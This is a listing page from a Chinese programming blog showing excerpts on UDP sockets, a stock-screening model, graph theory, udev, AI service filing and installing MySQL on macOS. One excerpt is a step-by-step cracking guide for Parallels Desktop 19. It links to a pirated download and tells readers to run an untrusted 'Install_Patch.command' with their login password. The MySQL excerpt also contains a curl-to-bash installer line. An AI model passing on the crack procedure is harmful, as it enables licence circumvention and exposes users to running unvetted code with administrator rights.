		<a class="list__footer-readmore btn" href="/posts/8bb9b8415643e7c47a2058e7323d9f63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8435482b5c317213fc470a784b484fd9/" rel="bookmark">
			Parallels Desktop 19 怎么破解激活免费赠送Parallels Desktop 19 for Mac密钥
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Parallels Desktop 19 是一款Mac虚拟机软件，可以在Mac上运行Windows系统，它是Mac上最优秀的虚拟机软件之一。用户无需重启即可在Mac上同时运行Mac OS和Windows应用程序，且两者之间能够无缝切换，对此，用户甚至无需设置双系统。此外，它还支持各种主流操作系统，如Windows 10、Ubuntu和其他Linux发行版、Android等。通过安装安卓系统，用户可以直接在Mac上运行安卓应用，再也不用在手机上安装了。
Parallels Desktop 19在Mac 上运行 Windows, 简单,强大,无缝。 Parallels®Desktop Pro Edition 性能最大化且解锁 Mac 的最强功能。使用专为开发人员、创建人员和高级用户设计的高级功能和增强功能。
一下载安装 Parallels Desktop
软件下载完成后打开，双击打开 安装.dmg Parallels Desktop for Mac 19（标准永久版）下载安装包如下：
Parallels Desktop 19破解版下载链接: https://pan.baidu.com/s/19ifG2X6bbJyVHUK7pKZVhw 提取码: 2wva Parallels Desktop 下载地址: https://wm.makeding.com/iclk/?zoneid=60669
然后，再双击右侧的pd图标，如下图所示
输入开机密码或者指纹认证
等待安装初始化，软件将自动进行安装 Parallels Desktop 19 本体。
安装完成后，Parallels Desktop 19 将自动启动。到此，可以退出 Parallels Desktop 进行操作。
二 试用
将目录复制到桌面或其它目录中。打开目录，双击其中的“Install_Patch.command”文件，输入开机密码，以获得权限进行激活。
开机密码输入时，界面中是看不见的，正常输入即可。
然后，在界面内遇到需要输入的时候，全部输入y即可。
软件激活完成，可在"账户和许可证..."中，查看是否成功。
也可以在“关于”中查看授权信息。
​​如果你的Parallels Desktop软件试用期过了，不想用破解版，也不想用绕过激活的方式，又嫌PD官网的正版太贵。那么，这里有另外一种方式使用正版，也许适合你：我们有PD官方给大型企业的许可证授权，还剩少量名额，现在低价授权给本站用户。不用多考虑，这是目前最经济实惠的正版激活方式，独一无二！
Parallels Desktop 19 for Mac密钥 了解Parallels Desktop 19激活方式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8435482b5c317213fc470a784b484fd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/550da05b1165c6b6ec603633a0b6d727/" rel="bookmark">
			嵌入式学习——Linux高级编程复习（UDP编程）——day43
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. UDP编程——函数接口
1.1 socket
1. 定义
int socket(int domain, int type, int protocol);
2. 功能
创建一个用来进程通信的套接字,返回文件描述符
3. 参数
domain:AF_INET IPv4协议族
type:SOCK_STREAM 流式套接字 tcp传输协议
SOCK_DGRAM 数据报套接字 udp传输协议
SOCK_RAW 原始套接字 protocol:
默认为0 4. 返回值
成功返回套接字新文件描述符
失败返回-1 5. 注意
1.2 inet_addr
1. 定义
in_addr_t inet_addr(const char *cp);
2. 功能
将字符串IP地址转换为二进制IP地址 3. 参数
cp:字符串IP地址空间首地址
4. 返回值
成功返回二进制IP地址
5. 注意
1.3 htons
1. 定义
uint16_t htons(uint16_t hostshort);
2. 功能
将本地字节序（小端）转换为网络字节序（大端）
3. 参数
hostshort:本地端口号
4. 返回值
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/550da05b1165c6b6ec603633a0b6d727/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/553ead2547b072e0dec3e3afae9cf3c1/" rel="bookmark">
			Python 小市值股票模型代码及回测分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、模型介绍
二、代码详解
2.1 初始化函数
2.2 股票筛选过滤函数
2.3 止损函数
2.4 开盘时运行函数
2.5 调仓函数
三、回测结果分析
3.1 收益净值图与概述
3.2 模型收益概览
3.3 年度收益图
3.4 月度收益的时间序列
3.5 月度收益热力图
3.6 月度收益频次分布图
四、风险指标分析
4.1 滚动 Beta 指标
4.2 滚动 Sharpe 指标
4.3 前五大回撤区间分析
五、因子分析
5.1 风格分析
5.2 风险分析
六、总结与展望
一、模型介绍 小市值模型是一类重要的股票模型。它的基本原理是：过滤、筛选质量较好的小市值股票，下注今后一段时间，这些股票会有比较好的涨幅。
运行周期：每周运行
持仓数量：10 只股票
交易对象：上证综指和深证综指的成份股
筛股部分：过滤 涨跌停、停牌、ST、退市股票
排序方式：按市值升序排列。选择最小市值个股
择时部分：无
止损部分：每日检查，个股浮亏超过 20% 止损
资金分配：
① 初始阶段，每只股票等额分配资金买入
② 后续阶段，卖出不在待买入列表中的所有股票
③ 买入未持仓股票，调整已持仓股票的仓位
二、代码详解 2.1 初始化函数 导入 jqdata 模块。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/553ead2547b072e0dec3e3afae9cf3c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6cabecce356d0e172a10bda4c6bb198/" rel="bookmark">
			图论（一）之概念介绍与图形#matlab
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图论（一）之概念介绍与图形目录
前言
一、图论介绍
二、基本概念 2.1图的概念
2.2图形分类
2.3邻接矩阵
2.3.1无向图
2.3.2有向图
2.3.3有向赋权图
2.4出度（Outdegree）
2.5入度（Indegree）
3.四种图论图形的matlab代码
4.运行结果
5.图论应用
6.算法
总结
前言 图论——这一专注于点和线之间关系的学科，如同一条独特的脉络，将无数看似孤立的领域紧密地连接在一起。
一、图论介绍 从数学建模角度来看，图论（Graph Theory）是数学的一个分支，主要研究由若干给定的点（通常称为顶点或节点）以及连接这些点的线（通常称为边）所构成的图形。这种图形通常用来描述某些事物之间的某种特定关系，其中点代表事物，边表示事物之间具有的关系。
二、基本概念 2.1图的概念 图G通常表示为二元组(V(G),E(G))。公式（1）是非空有限集，称为顶点集，其中元素称为图G的顶点。顶点（或节点、点）是图中的基本元素，用来表示不同的对象、事件或位置。
公式（1） 公式（2）是顶点集V(G)中的无序(无向图)或有序(有向图)的两个元素组合组成的集合，即称为边集，其中元素称为边。边是连接两个顶点的线，表示顶点之间的关系或连接。边可以是有向的（单向关系），也可以是无向的（双向关系）。
公式（2） 赋权图：若图G=(V(G),E(G))的每一条边e都赋以一个实数w(e)，称w(e)为边e的权，G连同边上的权称为赋权图。
2.2图形分类 所有图论里的图都可以根据是否有向和是否加权分类。
2.3邻接矩阵 图1 四种图论基本图
2.3.1无向图 根据上图1中的无权无向图可以得出其邻接矩阵为：
2.3.2有向图 根据上图1中的无权有向图可以得出其邻接矩阵为：
2.3.3有向赋权图 根据上图1中的有权有向图可以得出其邻接矩阵为：
2.4出度（Outdegree） 定义：由某个顶点指出的边的个数称为该顶点的出度；解释：在有向图中，一个顶点的出度表示从这个顶点出发的边的数量；换句话说，这些边都是以该顶点为“尾”（tail），指向其他顶点作为“头”（head）。
示例：在图3中，顶点D指向顶点A和顶点C，那么顶点D的出度就是2。
2.5入度（Indegree） 定义：指向某个顶点的边的个数称为该顶点的入度；解释：在有向图中，一个顶点的入度表示指向这个顶点的边的数量；这些边都是以其他顶点为“尾”，以该顶点为“头”。
3.四种图论图形的matlab代码 clc; clear; %% 1. 创建无权的有向图和无向图 V = {'A', 'B', 'C', 'D'}; E = {'A' 'B'; 'B' 'C'; 'C' 'D'; 'D' ,'A'}; % 1.1 创建无权有向图 G_directed = digraph(E(:,1), E(:,2)); % 绘制图形 figure; % 只在这里调用 figure，以创建一个新的图形窗口 subplot(2,2,1); plot(G_directed, 'Layout', 'circle', 'NodeColor', [0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6cabecce356d0e172a10bda4c6bb198/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06eebe5a47711814983834024dd00da2/" rel="bookmark">
			【Linux应用】Linux系统的设备管理——Udev
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.udev概述 udev是 Linux2.6内核里的一个功能，它替代了原来的 devfs，成为当前 Linux 默认的设备管理工具，能够根据系统中的硬件设备的状态动态更新设备文件，包括设备文件的创建，删除等。
udev以守护进程的形式运行，通过帧听内核发出来的uevent来管理/dev目录下的设备文件。不像之前的设备管理工具，udev在用户空间运行，而不在内核空间运行。
udev会根据/etc/udev/udev.conf文件中的udev_rules指定的目录，逐个检查该目录下的文件，这个目录下的文件都是针对某类或某个设备应该施行什么措施的规则文件。
2.udev作用 Udev用于动态管理设备的设备管理器，主要是在设备插入或移除时，负责管理与这些事件相关联设备节点以及执行相应动作。
设备发现和管理：udev负责在 Linux 系统中检测和管理设备。当新设备插入或旧设备被移除时，udev负责识别这些变化，并在 /dev 目录下创建或删除相应的设备节点。
1.设备命名：Udev为设备节点提供了一个规范的命名机制，以便用户和应用程序能够更容易地识别设备。这有助于确保相同类型的设备在不同系统上都有相似的设备节点名称。
2.热插拔支持：Udev支持热插拔设备，即在系统运行时插入或移除设备。它可以动态地更新设备节点，而无需重新启动系统。
3.规则系统：Udev使用规则文件来定义在设备事件发生时要执行的操作。这些规则可以基于设备属性、类型和其他标识符来匹配。规则允许用户执行自定义脚本、设置环境变量、创建符号链接等操作。
4.持久化设备节点：Udev提供了机制，以确保设备节点的稳定性。即使设备在重新启动后未连接，Udev仍会分配相同的设备节点名称，以便应用程序可以依赖特定的设备节点。
5.提供额外信息：Udev为每个设备节点提供了大量的额外信息，例如设备类型、设备路径、驱动程序信息等。这些信息可用于用户空间的应用程序，以更好地理解和利用系统中的设备。
所有设备在Linux是以设备文件的形式存在，在早期的Linux版本中，/dev目录包含了所有可能出现的设备的设备文件。很难想想Linux用户如何在这些大量的设备文件中找到匹配条件的设备文件。现在udev只为那些连接到Linux操作系统的设备产生设备文件。并且udev能通过定义一个udev规则rule来产生匹配设备属性的设备文件，这些设备属性可以是内核设备名称、总线路径、厂商名称、型号、序列号或者磁盘大小等。
1.动态管理：当设备添加/删除时，udev守护进行帧听来自内核的 uevent，以此添加或者删除 /dev下的设备文件，所以udev只为已经连接的设备产生设备文件，而不会在 /dev 下产生大量虚无的设备文件。
2.自定义命名规则：通过 Linux 默认的规则文件，udev在/dev/ 里为所有的设备定义了内核设备名称，比如 /dev/sda、/dev/hda、/dev/fd 等等。由于udev是在用户空间运行，Linux 用户可以通过自定义的规则文件，灵活地产生标识性强的设备文件名，比如 /dev/boot_disk、/dev/root_disk、/dev/color_printer 等等。
3.设定设备的权限和所有者/组：udev可以按一定的条件来设置设备文件的权限和设备文件所有者/组。在不同的udev版本中，实现的方法不同，在 “如何配置和使用udev” 中会详解。
有匹配规则 没有规则匹配 内核检测到新设备 udevd接收设备信息 删除/dev目录中的设备文件 生成uevent 查找规则文件 创建设备文件 使用内核设备名创建文件 3.配置udev 配置使用udev通常涉及创建和编辑udev规则，这些规则定义了设备在系统中行为。在使用udev之前，了解一些基本概念，例如subsystem、KERNEL、ACTION等。
键含义ACTION事件 (uevent) 的行为，例如：add( 添加设备 )、remove( 删除设备 )。KERNEL在内核里看到的设备名字，比如sd*表示任意SCSI磁盘设备DEVPATH内核设备路径，比如/devices/*SUBSYSTEM子系统名字，例如：sda 的子系统为 block。BUS总线的名字，比如IDE,USB，iscsiDRIVER设备驱动的名字，比如ide-cdromID独立于内核名字的设备名字SYSFS{value}sysfs属性值，可以表示任意ENV{key}环境变量，可以表示任意PROGRAM可执行的外部程序，如果程序返回0值，该键则认为为真(true)RESULT上一个PROGRAM调用返回的标准输出。NAME根据这个规则创建的设备文件的文件名。注意：仅仅第一行的NAME描述是有效的，后面的均忽略。如果你想使用使用两个以上的名字来访问一个设备的话，可以考虑SYMLINK键。SYMLINK为/dev/下的设备文件产生符号链接。由于udev只能为某个设备产生一个设备文件，所以为了不覆盖系统默认的 udev 规则所产生的文件，推荐使用符号链接。OWNER设备文件的属组GROUP设备文件所在的组。MODE设备文件的权限，采用8进制RUN为设备而执行的程序列表LABEL在配置文件里为内部控制而采用的名字标签(下面的GOTO服务)GOTO跳到匹配的规则（通过LABEL来标识），有点类似程序语言中的GOTOIMPORT{type}导入一个文件或者一个程序执行后而生成的规则集到当前文件WAIT_FOR_SYSFS等待一个特定的设备文件的创建。主要是用作时序和依赖问题。OPTIONS特定的选项：last_rule 对这类设备终端规则执行；ignore_device 忽略当前规则；ignore_remove 忽略接下来的并移走请求。all_partitions 为所有的磁盘分区创建设备文件。 在/etc/udev/rules.d/目录下，有一些默认的udev规则文件，例如70-persistent-net.rules。可通过创建新的规则文件或编辑已有的规则文件来定义udev规则。规则文件的命名约定是以数字和描述性名称开头，例如10-local.rules。数字决定了规则的优先级，数字越小，规则越早被处理。
KERNEL==”*”, OWNER=”root” GROUP=”root”, MODE=”0600″ KERNEL==”tty”, NAME=”%k”, GROUP=”tty”, MODE=”0666″, OPTIONS=”last_rule” KERNEL==”scd[0-9]*”, SYMLINK+=”cdrom cdrom-%k” KERNEL==”hd[a-z]”, BUS==”ide”, SYSFS{removable}==”1″, SYSFS{device/media}==”cdrom”, SYMLINK+=”cdrom cdrom-%k” ACTION==”add”, SUBSYSTEM==”scsi_device”, RUN+=”/sbin/modprobe sg” 上面的例子给出了5个规则，每一个都是KERNEL或者ACTION键开头：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06eebe5a47711814983834024dd00da2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5ecb6d472e80c7def94f54c315116e0/" rel="bookmark">
			生成式人工智能备案办理指南，深度解析大模型备案全流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		早在2023年年初，国家互联网信息办公室、工业和信息化部、公安部针对深度合成服务制定的《互联网信息服务深度合成管理规定》（“《深度合成管理规定》”）顺利施行，其明确了深度合成服务相关方的义务与主体责任，强化了对互联网信息服务深度合成领域的管理。同年8月15日实施了《生成式人工智能服务管理暂行办法》，主要是针对提供生成式人工智能服务需要做大模型备案。这样就形成了由算法备案制度和生成式人工智能备案（下称“大模型备案”）构成的“双备案制”的实践机制。
《互联网信息服务深度合成管理规定》第十九条规定“具有舆论属性或者社会动员能力的深度合成服务提供者，应当按照《互联网信息服务算法推荐管理规定》履行或办理备案、变更、注销等相关手续。而大模型备案自《生成式人工智能服务管理暂行办法》施行之日起仅有半年多，对于大模型备案的流程、规则以及安全评估相关的具体事项，企业相关的经验也相对较少。
下面，众森企服小编就来给大家详细讲解下生成式人工智能大模型备案办理指南。
一、什么是大模型？ 大模型，即Foundation Models，通常是指具有大量参数和复杂结构的深度学习模型。这些模型的参数量较大，通常需要数十亿甚至上百亿个参数，相较于传统的较小规模模型，大模型具有更高的容量和表达能力。大模型可以通过训练大规模数据集，以实现更准确的预测和更高的性能，并依据相关指令，完成各种目标任务。我们熟知的OpenAI的ChatGPT与Google的Alpha Go就是典型的语言类大模型：ChatGPT以Transformer模型为基础，具有1750亿个参数；而Alpha Go具有超过1亿个参数。
目前企业应用大模型主要体现为以下三种模式：
1、自主构建基础大模型，但是考虑到训练大模型的成本和技术壁垒都非常高，因此只有少数企业会自建大模型。
2、建立行业大模型，通常是了解行业know-how的企业，结合自身掌握的行业数据，用基础大模型精调出更贴合实际场景的垂类行业大模型。
3、在基础大模型和行业大模型之上，开发AI应用，这也是目前大多数企业采取的模式。
二、大模型上线的合规要素 在我国当前的监管体系下，大模型合规要素主要涉及的范畴包括平台运营合规、内容合规、平台管理合规、网络安全与数据合规、算法技术合规、国际联网合规等方面，具体合规要素以及相应的法律法规依据详见下图：
三、大模型上线备案如何申请 1、大模型上线备案所需资料 （1）大模型上线备案表，包含以下具体内容：
基本情况：模型名称、主要功能、适用人群、服务范围等。
模型研制：模型备案情况、训练算力资源（自研模型）、训练语料和标注语料来源与规模、语料合法性、算法模型的架构和训练框架等。
服务与安全防范：推理算力资源、服务方式及对象等、非法内容拦截措施、模型更新升级信息等。
安全评估：基本情况、评估情况。
自愿承诺：承诺所填信息真实性，并签字确认。
附件及备注：附件包括安全评估报告、模型服务协议、语料标注规则、拦截关键词列表、评估测试题。
（2）安全评估报告：提交的报告应包含语料安全评估、模型安全评估以及安全措施评估，并应在评估报告中形成整体评估结论。
（3）模型服务协议：一般包含产品及服务的各项规则及隐私条款等，需协同法务共同制定提交。
（4）语料标注规则：包括标注团队介绍、功能性及安全性标注细则，标注流程等。
（5）拦截关键词列表：总规模不宜少于10000个，应至少覆盖《生成式人工智能服务安全基本要求》A.1以及A.2中17种安全风险，A.1中每一种安全风险的关键词均不宜少于200个，A.2中每一种安全风险的关键词均不宜少于100个。
（6）评估测试题集：
该测试题集需要包括生成内容测试题库、拒答内容测试题库、非拒答测试题库。
测试题分类满足《生成式人工智能服务安全基本要求》中相关的风险类型，并有最小的数量要求。
测试题建议是“问题”(包含主谓宾)，不可只是短词、长文章。
生成内容测试题库中建议明确标记出哪些问题是需要拒答的、哪些是需要回答的。
2、大模型上线备案流程 向属地网信办报备，拿到备案表；
企业根据表格及评估要点准备填写材料；
企业内部展开评估，编写相关材料，准备测试账号；
材料附件及测试账号提交属地网信办审核；
属地网信办材料审核及技术测试审核通过后，属地上报中央网信办；未通过，修改材料或调整模型能力后再次提审，具体调整哪方面根据属地网信反馈进行；
中央网信办进行材料复审及技术评审，通过，企业下发备案号；未通过，需重新进行上线备案。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feaac296dffc90edb4411ca22f8e8562/" rel="bookmark">
			超详细！全避坑！macOS下的m芯片安装mysql并连接Navicat，解决Access denied for user ‘root‘@‘localhost‘ 及系统红绿状态跳
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		帖主在按照csdn上的帖子Macbook在配置mysql时总是不成功，下载下来的mysql在系统设置里总是变红绿色之间来回跳动，并无法连接Navicat进入mysql，修改了一天几乎把坑几乎全踩了，给各位参考。
首先，绝大部分教程都是在官网选择下arm或x86系列，再一步步点安装完成后还有很多其他的问题。然而根本不需要如此繁琐，在这里我们选用使用mac所带的brew工具进行下载安装。
brew安装及配置 Homebrew是macOS的包管理工具。首先，如果你还没有安装Homebrew，请按照以下步骤进行安装：
以下命令默认都在根目录进行，如不在请先cd ~到根目录
打开终端并运行以下命令：
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh 如果不行考虑开T子，使用git进行安装
git clone https://github.com/Homebrew/brew ~/.brew 安装完成后，按照提示将Homebrew添加到你的路径中。通常，它会要求你运行以下命令：
echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' &gt;&gt; ~/.zprofile eval "$(/opt/homebrew/bin/brew shellenv) 更新Homebrew
brew update 通过brew安装MYSQL 在终端中运行以下命令来安装MySQL：
brew install mysql 安装完成后，启动MySQL服务：
brew services start mysql 注：在这里可能会出现报错
Bootstrap failed: 5: Input/output error Try re-running the command as root for richer errors. Error: Failure while executing; /bin/launchctl bootstrap gui/501 /Users/jimmy/Library/LaunchAgents/homebrew.mxcl.mysql.plist exited with 5. 解决办法：
确保所有相关目录和文件的权限正确：
sudo chown -R $(whoami):admin /opt/homebrew/var/mysql sudo chown -R $(whoami):admin /opt/homebrew/opt/mysql sudo chown -R $(whoami):admin ~/Library/LaunchAgents/homebrew.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/feaac296dffc90edb4411ca22f8e8562/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/264/">«</a>
	<span class="pagination__item pagination__item--current">265/621</span>
	<a class="pagination__item pagination__item--next btn" href="/page/266/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>